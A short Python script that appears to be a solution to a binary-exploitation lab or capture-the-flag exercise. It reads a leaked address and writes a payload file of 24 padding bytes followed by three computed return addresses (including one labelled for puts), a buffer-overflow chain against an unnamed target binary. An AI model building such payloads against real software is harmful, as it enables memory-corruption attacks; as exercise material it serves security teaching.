#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(f, v):
    assert isinstance(v, str)
    f.flush()
    f.write(v.encode("ascii"))
    f.flush()

def writeBytes(f, v):
    assert isinstance(v, bytes)
    f.flush()
    f.write(v)
    f.flush()

def writeLong(f, v):
    assert isinstance(v, int)
    f.flush()
    f.write(v.to_bytes(8, 'little'))
    f.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# TODO: Implement your solution here.
data = int(input(), 16) 
with open("t.bin", "wb") as file:
    writeStr(file, "T"*24)
    A = data + 222 
    file.write(A.to_bytes(8, 'little'))
    pwdA = data + 3439 
    file.write(pwdA.to_bytes(8, 'little'))
    puts = data + 105 
    file.write(puts.to_bytes(8, 'little'))

print("t.bin")